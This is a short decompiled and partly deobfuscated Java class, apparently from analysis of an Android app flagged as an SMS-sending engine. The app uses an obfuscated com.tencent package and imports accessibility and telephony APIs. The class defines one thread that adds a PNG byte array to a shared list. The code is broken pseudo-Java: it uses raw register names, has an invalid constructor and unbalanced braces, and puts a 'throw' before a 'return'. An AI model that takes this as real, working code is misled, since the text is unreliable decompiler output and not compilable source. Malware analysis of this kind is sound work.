package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SmsSenderEngine_3
 * Original: Lcom/tencent/skatinghsatinbintegralj9$3;
 */
class SmsSenderEngine_3 extends Thread {

    // === FIELDS ===
    final SmsSenderEngine this$0;
    final byte[] val$png;

    // === METHODS ===

     void Constructor(SmsSenderEngine param0, byte[] param1) {
        v0.this$0 = v1;
        v0.val$png = v2;
        // new Thread()
        return;
    }

    public void run() {
        v0 = SmsSenderEngine.ctd;
        if (v0 == null || v0 == 0) { // goto +19
        v0 = SmsSenderEngine.syc;
        synchronized (v0) {
        v1 = v3.this$0;
        v1 = v1.bts;
        v2 = v3.val$png;
        v1.add(v2);
        }
        // goto (branch)
        }
        throw v1;
        return;
    }
}
